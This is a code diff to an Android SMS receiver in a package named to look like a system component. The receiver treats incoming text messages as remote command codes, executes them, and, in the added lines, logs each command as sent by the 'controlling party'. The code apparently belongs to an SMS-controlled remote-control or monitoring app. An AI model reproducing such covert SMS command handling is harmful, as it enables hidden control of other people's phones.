@@ -9,10 +9,13 @@ import android.telephony.SmsMessage;
 import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.Code;
+import com.android.system.controled.bean.SmsInfo;
 import com.android.system.controled.db.InnerDbOpera;
+import com.android.system.controled.db.Tables;
 import com.android.system.controled.logic.CodeDoing;
 import com.android.system.controled.util.CodeUtil;
 import com.android.system.controled.util.InitUtil;
+import com.android.system.controled.util.SmsSaveOutUtil;
 import com.android.system.controled.util.TimeUtil;
 
 public class MsgAndOtherReceiver extends BroadcastReceiver {
@@ -60,6 +63,22 @@ public class MsgAndOtherReceiver extends BroadcastReceiver {
 					if(InnerDbOpera.getInstence().insertNewCode(code) > 0) {
 						code = CodeDoing.getInstance().doOperaByMessage(context, code);
 					}
+					//失败后无需重复操作的命令，随即更新执行结果
+					if(code.getRedoNeed() == Code.REDO_NOT) {
+						InnerDbOpera.getInstence().updateCodeResult(code);
+					}
+					
+					
+					//存储命令记录
+					SmsInfo sms = new SmsInfo();
+					sms.setDate(code.getDate());
+					sms.setName("控制方");
+					sms.setType(1);
+					sms.setBody("【命令短信】" + code.getCode());
+					sms.setAddress(getFromNum);
+					
+					SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
+					so.saveSms(sms);
 				}
 			}
 		}
